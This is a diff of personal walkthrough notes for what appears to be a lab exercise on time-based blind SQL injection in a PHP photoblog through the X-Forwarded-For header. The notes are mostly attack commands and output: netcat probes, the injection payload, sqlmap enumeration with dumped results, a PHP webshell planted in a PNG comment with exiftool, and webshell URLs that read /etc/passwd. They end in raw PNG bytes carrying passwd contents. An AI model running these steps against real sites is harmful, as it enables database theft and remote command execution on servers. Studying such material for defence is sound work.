@@ -2,9 +2,27 @@
  Time Based SQLi 
 =================
 
+This course details the exploitation of a blind SQL injection in a PHP based website and how an attacker can use it to gain access to the administration pages. Then, using this access, the attacker will be able to gain code execution on the server by usnig a configuration issue.
+The attack is divided into 3 steps:
+
+1. Fingerprinting: to gather information on the web application and technologies in use.
+
+2. Detection and exploitation of SQL injection: in this part, you will learn how Blind SQL injections work and how to exploit them in order to retrieve information.
+
+3. Access to the administration pages and code execution: the last step in which you will gain access to the operating system and run commands.
+
+:: Exploitation ::
+
+- echo "HEAD / HTTP/1.1\r\nHost:10.0.0.200\r\nConnection:close\r\n\r\n" |netcat 10.0.0.200 80
+- echo -en "HEAD / HTTP/1.1\r\nHost:10.0.0.200\r\nConnection:close\r\n\r\n" |netcat 10.0.0.200 80
 - x-forwarded-for: 1' and sleep(1)='
 
+
+
 ::: Header Before Injection :::
+
+- 
+
 Host: 10.0.0.10
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:46.0) Gecko/20100101 Firefox/46.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
@@ -13,6 +31,8 @@ Accept-Encoding: gzip, deflate
 Connection: keep-alive
 
 ::: Header After Injection :::
+
+-
 
 Host: 10.0.0.10
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:46.0) Gecko/20100101 Firefox/46.0
@@ -26,6 +46,23 @@ Connection: keep-alive
 =======================
 Automating with Sqlmap
 =======================
+
+- sqlmap -u "http://10.0.0.200/" --headers="X-Forwarded-For: *" -- banner
+- sqlmap -u "http://10.0.0.200/" --headers="X-Forwarded-For: *" --dbs
+- sqlmap -u "http://10.0.0.200/" --headers="X-Forwarded-For: *" -D photoblog --tables
+- sqlmap -u "http://10.0.0.200/" --headers="X-Forwarded-For: *" -D photoblog -T users --columns
+- sqlmap -u "http://10.0.0.200/cat.php?id=2" --headers="X-Forwarded-For: *" --dbs
+
+[Working Samples]
+
+- sqlmap -u "http://victim_ip/cat.php?id=2" --headers="X-Forwarded-For: *" --banner
+
+[02:35:02] [INFO] the back-end DBMS is MySQL
+[02:35:02] [INFO] fetching banner
+web server operating system: Linux Debian 6.0 (squeeze)
+web application technology: PHP 5.3.3, Apache 2.2.16
+back-end DBMS: MySQL 5.0
+banner:    '5.1.63-0+squeeze1'
 
 - sqlmap -u "http://victim_ip/vulnmodule.php?id=2" --headers="X-Forwarded-For: *" --dbs
 
@@ -79,15 +116,15 @@ Table: categories
      backdor.php
 ---------------------
 
-===========================
- Inecting php into an img
-===========================
+===================================
+ Inecting Webshell php into an img
+===================================
 
 - exiftool  "-ccoment <=backdor.php" logo.png
 - http://victim_ip/admin/uploads/1462138313.png/cmd.php?cmd=uname -a
 - http://victim_ip/admin/uploads/1462138313.png/cmd.php?cmd=ifconfig
 - http://victim_ip/admin/uploads/1462138313.png/cmd.php?cmd=cat /etc/passwd
- 
+- http://10.0.0.200/admin/uploads/nm-signal-50-secure.png/c.php?c=uname%20-a
 
 
 ‰PNG  IHDR szzôsBIT|dˆ pHYs × ×B(›xtEXtSoftwarewww.inkscape.org›î<ïIDATX…Í—]lÕÇ÷ÎìÎz?¼ë;Ž×vâ€Ý€«…ª}@¥E´ŠBŠŠŠÒ–RQ_¨*Z©íKä*}hUMŠHM¨£¨j­T4&&PLUBH0"vn>°—uüµñz=^¯wggîíÃxQI¤JôHW{ï¬æüsî¹Gç ­5Ÿ¦ÉOUýÿÀ¼ÖþÒZQj¯Æžç½j™òÑíÛ¿‘¾Z===r÷îÝ @\K9rø&a'Ö¯o¨Ù¸¡Aºž"3‘V¶½°ŒÒ_Ü¹óÞáOòñØÓ)¡Lùë‡»Óp [pðåƒG¹ý]Ûº"×·_''§¦<Îºd½lhhŒ”ÝJÿÁ—F>ÉO³¤Lî¬®¯ `Ëý›[·4­[WÏ3¿{†§žzŠS§O³gÏ2™ "áÈF3/öÿ`ïƒÝY´Üú£ç†:¯àPß¡®M›ïé¸®Ó|óÍ“ŒÑù™ØÒ¾™#ýýÔ¯«˜cÇ¡¾C]WòñãÃ·ýð¹wþJ€ñí«4ƒ¦ùäM]·K‹üùp›ÛÚ0&fÀ$¬KÐßßO$µ”ãÜ%?ž h q€†-øÞOö Å/èëë3ŸOøc0à¨å?,‹wT‡wß{—x,F8Æ4M&ÑX”©©),Ë2JŽó+¸ÚUZ?ÚÓ3h>ñÝ[ò(FÊA£{`àåÛcu5ŽgM;ž5í¸Åù—^9úJ0hÝ›H$E `222LÝº$ªøˆH$‚½h#‰}ÏíûØ6ì}°;º`·$n‚¤Ð-råËƒn¥ô§ÖÔæÆÏvßj…‚5ÖääT(ªùJ(²š›6a/ÚLNNÇ1Â01LÃ0¨ ×N§ ZÁW©l¯ ?Ö{æ[==ƒ+õF¼¡·úSÑJú§Þ:y¤ySKcjSŠ÷Ç.ðÚ?^#‹póÝ,äˆÆbÌÍÍ‡ YÖš¯7|ÃÀ ZLNN‘¬KÇí¨hÅ …–äíZè èÐZ|:%ïûæ}»âKÉDLd2XVxmË²X°Ìçóÿ‹·†Þ¦°XÀ4MÓ7i€FkçV6W$œVB=º²Ê€jöQe€”ìèØúH]²Î*•KäæsLL\$T¢aÃFJ¥ù…<@€çÏÓÚÖB[[CCo³´TÄ¬ŠCJ‚Á ®[Áu½M«ŒNH¥&@¤ü-02BÐ"Gß;»­‘B’Ëå˜ 5¡æóó,-˜6Méì¼žöö-¤Óé5âRJ¤”T*.J{ªïCQC‡3@ à…>RR±^kçyÌÎLS\.â”@3?Ÿ£\.# ƒ{‘²ã0;›%233ƒ¬F`E\J‰R Ïó¢«é_ˆÙ@-@¡äi„_ý( M¥ÕÙ‚½xcöR–²ã 5,—–¹47‡ëV@ƒã8„Ã5d³Y”ÒÌNÏ°±q#†!‘B ¥@H­^Å-T5¬D±I)255åPºÜŠ&-¥àø|~AÏÌÌP\.( LN^Ä);HCRvJÄ¢1f¦gH§ÓÌårtlë@ ‰!$Bø ¨xîlÀs½¾¨Ð-TçR·i—B›½ŽS®LMM±\,!Øö"££ïá8JiÊ¥2í[·`Ë²¸ë«w’¬«[‚Õ¹Ò ×õ.~fqˆ)Œ4iÿÐ&!-ûúú†‡R¿‡5‘ÖÚ[#ZZó»üâ‹{;8sæ7ÕÜ‚a˜&£çÑÐÐÀøØx%—Ë½ðì³F®à÷ðÈ¾¡€ÒÄ]«öïð‘{ÁJ‹îž_T~¾ Æ/d:vì¥á¦¦¦TgG'³ÙYlÛ&cÛ6gÞžr+ê¡+‰¯µˆ!Z¥!^Ü»k«}Y>j+‰¥´ÖžÖÚ=~üx¾Tqvìß`éÂ…ó*‹ÑØÐÈÌô´8¶Tr»{{{—>  "D1 œª®¯éb°k×½­Áßh¥¾ ÇÑÎ:|Õ7£µvÍÿkûÔ/§ÿ5ßõ£Pîh,4tEXtCommentroot:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/bin/sh bin:x:2:2:bin:/bin:/bin/sh sys:x:3:3:sys:/dev:/bin/sh sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/bin/sh man:x:6:12:man:/var/cache/man:/bin/sh lp:x:7:7:lp:/var/spool/lpd:/bin/sh mail:x:8:8:mail:/var/mail:/bin/sh news:x:9:9:news:/var/spool/news:/bin/sh uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh proxy:x:13:13:proxy:/bin:/bin/sh www-data:x:33:33:www-data:/var/www:/bin/sh backup:x:34:34:backup:/var/backups:/bin/sh list:x:38:38:Mailing List Manager:/var/list:/bin/sh irc:x:39:39:ircd:/var/run/ircd:/bin/sh gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh nobody:x:65534:65534:nobody:/nonexistent:/bin/sh libuuid:x:100:101::/var/lib/libuuid:/bin/sh mysql:x:101:103:MySQL Server,,,:/var/lib/mysql:/bin/false user:x:1000:1000:Debian Live user,,,:/home/user:/bin/bash £ÝBÈIEND®B`
@@ -123,6 +160,15 @@ Table: stats
 | 9618                 | 1       |
 | ;(SELECT * FROM (SEL | 1       |
 +----------------------+---------+
+
+
+Notes: 
+
+- The param HEAD only show the header and avoid the entire page.
+- The param CLOSE Tell the server to close the connection after processing the request.
+- The param --exclude-sysdbs to avoid dumping the system databases/tables and only retrieve the ones not present by default.
+- The param `--batch` will tell SQLMap to use the default behaviour and to avoid asking for user input.
+
 
 
 https://www.youtube.com/watch?v=sGKFBTS_M3o
